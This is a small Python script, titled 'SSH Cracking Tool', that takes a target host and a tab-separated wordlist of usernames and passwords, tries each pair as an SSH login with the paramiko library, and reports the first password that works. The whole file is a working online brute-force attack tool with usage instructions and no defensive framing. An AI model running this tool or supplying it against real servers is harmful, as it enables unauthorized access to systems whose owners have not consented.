#!/usr/bin/env python
import paramiko, sys, socket
problem = "\n"
def help():
    print("[S]SH [C]racking [T]ool")
    print("Usage: ./sct.py <host> <wordlist>")
    print
    print("Wordlist must be <name    password> where blanked = <TAB>")
    print(problem)
    sys.exit()
def SCT():
    try:
        target = sys.argv[1]
        wordlist = sys.argv[2]
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for p in open(wordlist, "r").readlines():
            [name, passw] = p.strip().split()
            try:
                print("Trying host=%s name:\033[93m%s \033[0mpassword:\033[93m%s\033[0m " % (target, name, passw))
                ssh.connect(target, username=name, password=passw)
            except paramiko.AuthenticationException:
                continue
            print("\npassword:%s is valid" % passw)
            break
    except IndexError:
        global problem
        problem = "\n\033[1mPlease check your command line input\033[0m"
        help()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Couldn't connect on host %s port 22" % target)
        sys.exit()
    except IOError:
        print("Wordlist Error")
        sys.exit()
    except KeyboardInterrupt:
        print("Exiting tool now..")
        sys.exit()
SCT()
